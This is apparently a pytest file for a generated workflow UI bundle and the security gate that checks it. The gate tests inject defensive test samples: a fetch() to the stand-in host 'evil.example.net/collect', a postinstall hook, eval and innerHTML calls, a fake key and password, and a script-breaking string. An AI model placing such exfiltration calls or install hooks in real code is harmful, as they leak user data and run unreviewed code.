"""WG-20 (#768): the UI bundle every Workflow ships (ADR 0033).

The bundle is rendered from the released `workflow-ui` template and the Workflow's own Sub-Skills.
MS01 is the real fixture; the second Workflow is shaped differently (two skills, enums, a number, a
boolean, a file, a table and an editable text) to show nothing is specific to one Workflow. Key-like
strings are built at run time. No model is called: the copy is a literal `UiCopy`.
"""

import copy
import json
import shutil
from pathlib import Path
from typing import Any

import pytest
from fixtures import fixture_path
from sbam_contracts.manifest import SkillManifest
from sbam_workers.build.codegen.errors import TemplateError, TemplateErrorCode
from sbam_workers.build.codegen.store import default_templates_dir
from sbam_workers.build.gates.ui_gate import check_ui_bundle_files
from sbam_workers.build.ui_bundle import (
    GENERATED_FILE,
    SubCopy,
    UiBundle,
    UiBundleError,
    UiBundleInput,
    UiCopy,
    UiTemplate,
    build_ui_bundle,
    input_fields,
    load_ui_template,
    output_fields,
)

SERVER = "wf_investor_onboarding"


def ms01(skill_id: str = "MS01.1_Investor_Auth_Manager", **over: Any) -> dict[str, Any]:
    text = fixture_path("isa14", "ms01_1_manifest.json").read_text(encoding="utf-8")
    data: dict[str, Any] = json.loads(text.replace("MS01.1_Investor_Auth_Manager", skill_id))
    for dotted, value in over.items():
        node = data
        *path, last = dotted.split("__")
        for key in path:
            node = node[key]
        node[last] = value
    return data


def sealed(data: dict[str, Any]) -> SkillManifest:
    return SkillManifest.sealed(data)


@pytest.fixture(scope="module")
def template() -> UiTemplate:
    return load_ui_template()


@pytest.fixture(scope="module")
def ms01_bundle(template: UiTemplate) -> UiBundle:
    return build_ui_bundle(
        UiBundleInput("Investor Onboarding", SERVER, [sealed(ms01())]), template=template
    )


def quote_workflow() -> list[SkillManifest]:
    """A Workflow of another shape: two macro categories, each with its own kind of screen."""
    first = ms01(
        "MS01.1_Quote_Intake",
        skill_metadata__macro_category="MS01_Quote_Intake",
        skill_metadata__skill_name="Quote Intake",
        isatvon_definition__n_notification__next="MS02.1_Supplier_Pick",
        sbam_build_record__isatvon_detail__n_notification__next="MS02.1_Supplier_Pick",
        contracts__input_schema={
            "type": "object",
            "properties": {
                "region": {"type": "string", "enum": ["EMEA", "APAC"]},
                "quantity": {"type": "integer"},
                "rush": {"type": "boolean"},
                "bom_file": {"type": "string", "format": "binary", "description": "BOM"},
                "notes": {"type": "string", "maxLength": 500},
                "lines": {"type": "array", "items": {"type": "object"}},
            },
            "required": ["region", "quantity"],
        },
        contracts__output_schema={
            "type": "object",
            "properties": {
                "cost_lines": {"type": "array", "items": {"type": "object"}},
                "cover_letter": {"type": "string", "contentMediaType": "text/markdown"},
                "total": {"type": "number"},
            },
            "required": [],
        },
    )
    second = ms01(
        "MS02.1_Supplier_Pick",
        skill_metadata__macro_category="MS02_Supplier_Selection",
        skill_metadata__skill_name="Supplier Pick",
    )
    return [sealed(first), sealed(second)]


@pytest.fixture(scope="module")
def quote_bundle(template: UiTemplate) -> UiBundle:
    return build_ui_bundle(
        UiBundleInput("Quote Automation", "wf_quote_automation", quote_workflow()),
        template=template,
    )


# --- the template -----------------------------------------------------------------------------


def test_wg20_template_is_released_and_its_hash_is_checked(
    tmp_path: Path, template: UiTemplate
) -> None:
    assert template.name == "workflow-ui" and len(template.sha256) == 64
    root = tmp_path / "templates"
    shutil.copytree(default_templates_dir(), root)
    css = root / "workflow-ui" / "1.0.0" / "static" / "src" / "theme.css"
    css.write_bytes(css.read_bytes() + b"\n.x{}\n")
    with pytest.raises(TemplateError) as error:
        load_ui_template(root=root)
    assert error.value.code is TemplateErrorCode.TEMPLATE_HASH_MISMATCH
    with pytest.raises(TemplateError) as missing:
        load_ui_template("9.9.9")
    assert missing.value.code is TemplateErrorCode.TEMPLATE_NOT_FOUND


def test_wg20_template_uses_only_the_bam_ui_libraries(template: UiTemplate) -> None:
    assert set(template.dependencies) == {
        "@fontsource/inter", "@refinedev/core", "@tabler/icons-react", "@tiptap/pm",
        "@tiptap/react", "@tiptap/starter-kit", "@uppy/core", "@uppy/dashboard", "@uppy/react",
        "ag-grid-community", "ag-grid-react", "react", "react-dom",
    }  # fmt: skip


# --- WG20-T01 / T02: forms follow the schema --------------------------------------------------


def test_wg20_t01_form_fields_match_the_input_schema(ms01_bundle: UiBundle) -> None:
    [skill] = ms01_bundle.spec["skills"]
    [sub] = skill["subs"]
    schema = ms01()["contracts"]["input_schema"]
    assert [f["name"] for f in sub["inputs"]] == schema["required"]
    assert all(
        f["required"] and f["widget"] == "text" and f["type"] == "string" for f in sub["inputs"]
    )
    assert sub["actionTool"] == "MS01_1__action" and sub["checkTool"] == "MS01_1__check"


def test_wg20_t01_every_kind_of_field_gets_its_own_widget() -> None:
    schema = quote_workflow()[0].dump()["contracts"]["input_schema"]
    fields = {f["name"]: f for f in input_fields(schema, {})}
    assert [f["name"] for f in input_fields(schema, {})][:2] == ["region", "quantity"]
    assert fields["region"]["widget"] == "select" and fields["region"]["enum"] == ["EMEA", "APAC"]
    assert fields["quantity"]["widget"] == "number" and fields["quantity"]["required"]
    assert fields["rush"]["widget"] == "checkbox" and not fields["rush"]["required"]
    assert fields["bom_file"]["widget"] == "file" and fields["bom_file"]["description"] == "BOM"
    assert fields["notes"]["widget"] == "textarea" and fields["lines"]["widget"] == "json"


def test_wg20_t01_results_get_a_table_an_editor_or_key_values() -> None:
    schema = quote_workflow()[0].dump()["contracts"]["output_schema"]
    views = {f["name"]: f["view"] for f in output_fields(schema)}
    assert views == {"cost_lines": "grid", "cover_letter": "editor", "total": "kv"}


def test_wg20_t02_a_schema_change_regenerates_the_form(template: UiTemplate) -> None:
    before = build_ui_bundle(UiBundleInput("W", SERVER, [sealed(ms01())]), template=template)
    changed = ms01()
    schema = changed["contracts"]["input_schema"]
    schema["properties"]["tier"] = {"type": "string", "enum": ["gold", "silver"]}
    after = build_ui_bundle(UiBundleInput("W", SERVER, [sealed(changed)]), template=template)
    names = [f["name"] for f in after.spec["skills"][0]["subs"][0]["inputs"]]
    assert "tier" in names and "tier" not in [
        f["name"] for f in before.spec["skills"][0]["subs"][0]["inputs"]
    ]
    assert after.digest != before.digest
    unchanged = {p for p, d in after.files.items() if before.files.get(p) == d}
    assert "src/App.tsx" in unchanged and GENERATED_FILE not in unchanged  # only the data moves


def test_wg20_the_same_inputs_give_the_same_bytes(template: UiTemplate) -> None:
    one = build_ui_bundle(UiBundleInput("W", SERVER, quote_workflow()), template=template)
    two = build_ui_bundle(UiBundleInput("W", SERVER, quote_workflow()), template=template)
    assert one.files == two.files and one.digest == two.digest
    assert one.entry.digest == one.digest and one.entry.workflow_server == SERVER


# --- golden: MS01 and a differently-shaped Workflow -------------------------------------------

TEMPLATE_FILES = {
    "index.html", "package.json", "bundle.json", "tsconfig.json", "vite.config.ts",
    "src/main.tsx", "src/App.tsx", "src/provider.ts", "src/mcp.ts", "src/types.ts",
    "src/theme.css", "src/icons.tsx", "src/Intake.tsx", "src/Grid.tsx", "src/Editor.tsx",
    "src/StepForm.tsx", "src/Outputs.tsx", "src/assets/bull-head.png", "src/vite-env.d.ts",
    GENERATED_FILE,
}  # fmt: skip


def test_wg20_golden_ms01_bundle(ms01_bundle: UiBundle) -> None:
    assert set(ms01_bundle.files) == TEMPLATE_FILES
    [skill] = ms01_bundle.spec["skills"]
    assert (skill["n"], skill["name"]) == (1, "Investor Registration Access")
    assert skill["review"]["name"] == "Human review"
    [sub] = skill["subs"]
    assert [(s["mode"]) for s in sub["steps"]] == ["human", "auto", "auto"]  # intake, action, check
    assert sub["steps"][1]["note"] == "Auth_MCP (Session & OTP Evaluator)"
    assert [f["name"] for f in sub["outputs"]] == [
        "auth_status", "jwt_token", "state_handoff_id", "user_role",
    ]  # fmt: skip
    assert skill["hook"] == "Last skill of the workflow"  # its `next` is outside this workflow
    assert b"mock" not in ms01_bundle.files["src/provider.ts"].lower()
    assert b"<title>Investor Onboarding</title>" in ms01_bundle.files["index.html"]


def test_wg20_golden_second_workflow_is_not_rfq_or_ms01_shaped(
    quote_bundle: UiBundle, ms01_bundle: UiBundle
) -> None:
    spec = quote_bundle.spec
    assert [s["name"] for s in spec["skills"]] == ["Quote Intake", "Supplier Selection"]
    assert spec["serverName"] == "wf_quote_automation" and spec["skills"][0]["n"] == 1
    assert spec["skills"][0]["hook"] == "Hook passes the result to Supplier Selection"
    assert spec["skills"][1]["hook"] == "Last skill of the workflow"
    first = spec["skills"][0]["subs"][0]
    assert first["id"] == "MS01.1_Quote_Intake" and len(first["inputs"]) == 6
    assert set(quote_bundle.files) == TEMPLATE_FILES
    assert quote_bundle.digest != ms01_bundle.digest
    assert quote_bundle.files["src/App.tsx"] == ms01_bundle.files["src/App.tsx"]  # same pattern
    for text in (b"RFQ", b"BOM Automation", b"CAM"):
        assert all(
            text not in data for p, data in quote_bundle.files.items() if p != GENERATED_FILE
        )


def test_wg20_copy_fills_text_only(template: UiTemplate) -> None:
    text = UiCopy(
        sub_skills={
            "MS01.1_Investor_Auth_Manager": SubCopy(
                summary="Check the investor's one-time code.",
                field_help={"mobile_number": "10 digits"},
            )
        },
        review_notes={"MS01_Investor_Registration_Access": "Confirm the login result."},
    )
    bundle = build_ui_bundle(
        UiBundleInput("W", SERVER, [sealed(ms01())], copy=text), template=template
    )
    [skill] = bundle.spec["skills"]
    assert skill["subs"][0]["summary"] == "Check the investor's one-time code."
    assert skill["subs"][0]["inputs"][0]["description"] == "10 digits"
    assert skill["review"]["note"] == "Confirm the login result."
    hostile = UiCopy(
        sub_skills={"MS01.1_Investor_Auth_Manager": SubCopy(summary='"</script> ${x}\u2028')}
    )
    out = build_ui_bundle(
        UiBundleInput("W", SERVER, [sealed(ms01())], copy=hostile), template=template
    )
    assert out.spec["skills"][0]["subs"][0]["summary"].startswith('"</script> ${x}')
    assert b"\xe2\x80\xa8" not in out.files[GENERATED_FILE]


def test_wg20_a_workflow_that_cannot_be_described_is_refused(template: UiTemplate) -> None:
    with pytest.raises(UiBundleError) as none:
        build_ui_bundle(UiBundleInput("W", SERVER, []), template=template)
    assert none.value.code == "NO_SKILLS"
    with pytest.raises(UiBundleError) as twice:
        build_ui_bundle(
            UiBundleInput("W", SERVER, [sealed(ms01()), sealed(ms01())]), template=template
        )
    assert twice.value.code == "SKILL_DUPLICATE"


def test_wg20_every_skill_ends_with_a_review_and_every_sub_skill_can_run(
    quote_bundle: UiBundle,
) -> None:
    """The walk-through the headless run makes, read from the data: each skill lists its Sub-Skills
    (action then check tool) and ends with the human review checkpoint."""
    for skill in quote_bundle.spec["skills"]:
        assert skill["review"]["name"] == "Human review" and skill["subs"]
        for sub in skill["subs"]:
            assert sub["steps"][-2]["mode"] == "auto" and sub["steps"][-1]["mode"] == "auto"
            assert sub["actionTool"].endswith("__action") and sub["checkTool"].endswith("__check")
    app = quote_bundle.files["src/App.tsx"].decode()
    assert all(f'data-pane="{p}"' in app for p in ("rail", "assistant", "steps"))
    assert "Approve" in app and "Send back" in app


# --- WG20-T04 and the drift gate --------------------------------------------------------------


def verdict(
    bundle: UiBundle,
    template: UiTemplate,
    edits: dict[str, bytes | None],
    hosts: tuple[str, ...] = (),
) -> list[str]:
    files = copy.copy(dict(bundle.files))
    for path, data in edits.items():
        if data is None:
            files.pop(path, None)
        else:
            files[path] = data
    return [f["code"] for f in check_ui_bundle_files(files, template, hosts).findings]


def test_wg20_a_generated_bundle_passes_the_gate(
    ms01_bundle: UiBundle, quote_bundle: UiBundle, template: UiTemplate
) -> None:
    assert verdict(ms01_bundle, template, {}) == []
    assert verdict(quote_bundle, template, {}) == []


def test_wg20_t04_the_ui_cannot_reach_an_undeclared_host(
    ms01_bundle: UiBundle, template: UiTemplate
) -> None:
    app = ms01_bundle.files["src/App.tsx"]
    call = b'\nfetch("https://evil.example.net/collect");\n'
    assert (
        verdict(ms01_bundle, template, {"src/App.tsx": app + call}).count("UI_HOST_UNDECLARED") == 1
    )
    declared = verdict(
        ms01_bundle,
        template,
        {
            "src/provider.ts": ms01_bundle.files["src/provider.ts"]
            + b'\nconst api = "https://api.example.com/x";\n'
        },
        ("api.example.com",),
    )
    assert "UI_HOST_UNDECLARED" not in declared
    wild = b'\nconst cdn = "https://img.cdn.example.com/a.png";\n'
    assert "UI_HOST_UNDECLARED" not in verdict(
        ms01_bundle, template, {"src/App.tsx": app + wild}, ("*.cdn.example.com",)
    )
    assert "UI_HOST_UNDECLARED" in verdict(
        ms01_bundle, template, {"src/App.tsx": app + wild}, ("cdn.example.com",)
    )
    other = verdict(ms01_bundle, template, {"src/App.tsx": app + b"\nnew WebSocket(url);\n"})
    assert "UI_HOST_UNDECLARED" in other
    page = ms01_bundle.files["index.html"].replace(
        b"/src/main.tsx", b"https://cdn.example.org/x.js"
    )
    assert "UI_HOST_UNDECLARED" in verdict(ms01_bundle, template, {"index.html": page})
    assert "UI_HOST_INVALID" in verdict(ms01_bundle, template, {}, ("https://x.example.com",))


def test_wg20_the_gate_rejects_a_bundle_that_departs_from_the_pattern(
    ms01_bundle: UiBundle, template: UiTemplate
) -> None:
    files = ms01_bundle.files
    package = json.loads(files["package.json"])
    package["dependencies"]["antd"] = "^5.0.0"
    package["dependencies"]["react"] = "^18.0.0"
    package["scripts"]["postinstall"] = "node x.js"
    codes = verdict(ms01_bundle, template, {"package.json": json.dumps(package).encode()})
    assert codes.count("UI_DEPENDENCY") == 3
    assert "UI_FILE_MISSING" in verdict(ms01_bundle, template, {"src/Grid.tsx": None})
    assert "UI_FILE_EXTRA" in verdict(ms01_bundle, template, {"src/Extra.tsx": b"export {};\n"})
    assert "UI_TEMPLATE_DRIFT" in verdict(ms01_bundle, template, {"src/theme.css": b"body{}\n"})
    app = files["src/App.tsx"].replace(b'data-pane="assistant"', b"")
    assert "UI_PANE_MISSING" in verdict(ms01_bundle, template, {"src/App.tsx": app})
    grid = (
        files["src/Grid.tsx"] + b'\nimport "lodash";\nimport("./x");\nconst m = "m"; import(m);\n'
    )
    codes = verdict(ms01_bundle, template, {"src/Grid.tsx": grid})
    assert codes.count("UI_IMPORT") == 2  # lodash, and the dynamic one that names no literal
    mock = b"export const mockProvider = {};\n"
    assert "UI_PROVIDER" in verdict(ms01_bundle, template, {"src/provider.ts": mock})


def test_wg20_the_gate_rejects_secrets_and_unsafe_apis(
    ms01_bundle: UiBundle, template: UiTemplate
) -> None:
    app = ms01_bundle.files["src/App.tsx"]
    key = ("sk-" + "a1B2" * 8).encode()  # built at run time
    assert "UI_SECRET" in verdict(
        ms01_bundle, template, {"src/App.tsx": app + b'\nconst k = "' + key + b'";\n'}
    )
    password = b'\nconst config = { password: "' + b"hunter" + b'2222" };\n'
    assert "UI_SECRET" in verdict(ms01_bundle, template, {"src/App.tsx": app + password})
    for snippet in (
        b"\neval(code);\n",
        b"\nnew Function('a');\n",
        b"\nel.innerHTML = x;\n",
        b"\ndocument.write(x);\n",
    ):
        assert "UI_UNSAFE_API" in verdict(ms01_bundle, template, {"src/App.tsx": app + snippet})
    found = check_ui_bundle_files(
        {**ms01_bundle.files, "src/App.tsx": app + b'\nconst k = "' + key + b'";\n'}, template
    ).findings
    assert all(key.decode() not in f["message"] for f in found)  # a finding never repeats the value
